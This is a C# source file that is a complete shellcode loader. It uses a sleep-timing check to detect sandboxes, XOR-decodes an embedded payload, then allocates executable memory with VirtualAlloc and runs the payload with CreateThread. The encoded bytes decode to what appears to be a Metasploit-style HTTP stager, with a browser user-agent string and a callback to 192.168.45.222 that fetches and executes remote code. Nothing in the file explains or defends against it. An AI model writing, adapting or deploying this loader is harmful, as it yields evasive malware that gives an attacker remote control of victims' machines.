using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[553] {0xDE,0xCA,0xAD,0x22,0x22,0x22,0x42,0xAB,0xC7,0x13,0xF0,0x46,0xA9,0x70,0x12,0xA9,0x70,0x2E,0xA9,0x70,0x36,0x13,0xDD,0x2D,0x95,0x68,0x04,0xA9,0x50,0x0A,0x13,0xE2,0x8E,0x1E,0x43,0x5E,0x20,0x0E,0x02,0xE3,0xED,0x2F,0x23,0xE5,0x6B,0x57,0xCD,0x70,0xA9,0x70,0x32,0xA9,0x60,0x1E,0x23,0xF2,0xA9,0x62,0x5A,0xA7,0xE2,0x75,0x56,0x6E,0x23,0xF2,0x72,0xA9,0x7A,0x02,0x23,0xF1,0xA9,0x6A,0x3A,0xA7,0xEB,0x56,0x1E,0x13,0xDD,0x6B,0xA9,0x16,0xA9,0x23,0xF4,0x13,0xE2,0xE3,0xED,0x2F,0x8E,0x23,0xE5,0x1A,0xC2,0x57,0xD6,0x21,0x5F,0xDA,0x19,0x5F,0x06,0x57,0xC2,0x7A,0xA9,0x7A,0x06,0x23,0xF1,0x44,0xA9,0x2E,0x69,0xA9,0x7A,0x3E,0x23,0xF1,0xA9,0x26,0xA9,0x23,0xF2,0xAB,0x66,0x06,0x06,0x79,0x79,0x43,0x7B,0x78,0x73,0xDD,0xC2,0x7A,0x7D,0x78,0xA9,0x30,0xCB,0xA2,0xDD,0xDD,0xDD,0x7F,0x4A,0x4C,0x47,0x56,0x22,0x4A,0x55,0x4B,0x4C,0x4B,0x76,0x4A,0x6E,0x55,0x04,0x25,0xDD,0xF7,0x13,0xF9,0x71,0x71,0x71,0x71,0x71,0xCA,0x51,0x22,0x22,0x22,0x6F,0x4D,0x58,0x4B,0x4E,0x4E,0x43,0x0D,0x17,0x0C,0x12,0x02,0x0A,0x6F,0x43,0x41,0x4B,0x4C,0x56,0x4D,0x51,0x4A,0x19,0x02,0x6B,0x4C,0x56,0x47,0x4E,0x02,0x6F,0x43,0x41,0x02,0x6D,0x71,0x02,0x7A,0x02,0x13,0x11,0x7D,0x13,0x0B,0x02,0x63,0x52,0x52,0x4E,0x47,0x75,0x47,0x40,0x69,0x4B,0x56,0x0D,0x14,0x12,0x17,0x0C,0x13,0x0C,0x13,0x17,0x02,0x0A,0x69,0x6A,0x76,0x6F,0x6E,0x0E,0x02,0x4E,0x4B,0x49,0x47,0x02,0x65,0x47,0x41,0x49,0x4D,0x0B,0x02,0x74,0x47,0x50,0x51,0x4B,0x4D,0x4C,0x0D,0x13,0x14,0x0C,0x13,0x02,0x71,0x43,0x44,0x43,0x50,0x4B,0x0D,0x14,0x12,0x17,0x0C,0x13,0x0C,0x13,0x17,0x22,0x4A,0x18,0x74,0x5B,0x85,0xDD,0xF7,0x71,0x71,0x48,0x21,0x71,0x71,0x4A,0x99,0x23,0x22,0x22,0xCA,0x95,0x22,0x22,0x22,0x0D,0x46,0x49,0x60,0x6C,0x12,0x1B,0x77,0x51,0x46,0x7D,0x4F,0x11,0x7D,0x50,0x40,0x7D,0x12,0x54,0x48,0x49,0x77,0x63,0x6B,0x6C,0x4F,0x6B,0x73,0x67,0x54,0x49,0x74,0x64,0x58,0x45,0x7D,0x77,0x7A,0x5B,0x22,0x72,0x4A,0x75,0xAB,0xBD,0xE4,0xDD,0xF7,0xAB,0xE4,0x71,0x4A,0x22,0x10,0xCA,0xA6,0x71,0x71,0x71,0x75,0x71,0x74,0x4A,0xC9,0x77,0x0C,0x19,0xDD,0xF7,0xB4,0x48,0x28,0x7D,0x4A,0xA2,0x11,0x22,0x22,0xAB,0xC2,0x48,0x26,0x72,0x48,0x3D,0x74,0x4A,0x57,0x64,0xBC,0xA4,0xDD,0xF7,0x71,0x71,0x71,0x71,0x74,0x4A,0x0F,0x24,0x3A,0x59,0xDD,0xF7,0xA7,0xE2,0x57,0x36,0x4A,0xAA,0x31,0x22,0x22,0x4A,0x66,0xD2,0x17,0xC2,0xDD,0xF7,0x6D,0x57,0xEF,0xCA,0x69,0x22,0x22,0x22,0x48,0x62,0x4A,0x22,0x32,0x22,0x22,0x4A,0x22,0x22,0x62,0x22,0x71,0x4A,0x7A,0x86,0x71,0xC7,0xDD,0xF7,0xB1,0x71,0x71,0xAB,0xC5,0x75,0x4A,0x22,0x02,0x22,0x22,0x71,0x74,0x4A,0x30,0xB4,0xAB,0xC0,0xDD,0xF7,0xA7,0xE2,0x56,0xED,0xA9,0x25,0x23,0xE1,0xA7,0xE2,0x57,0xC7,0x7A,0xE1,0x7D,0xCA,0x49,0xDD,0xDD,0xDD,0x13,0x1B,0x10,0x0C,0x13,0x14,0x1A,0x0C,0x16,0x17,0x0C,0x10,0x10,0x10,0x22,0x99,0xC2,0x3F,0x08,0x28,0x4A,0x84,0xB7,0x9F,0xBF,0xDD,0xF7,0x1E,0x24,0x5E,0x28,0xA2,0xD9,0xC2,0x57,0x27,0x99,0x65,0x31,0x50,0x4D,0x48,0x22,0x71,0xDD,0xF7};
            
            byte xorbyte = 0x22;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xorbyte);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
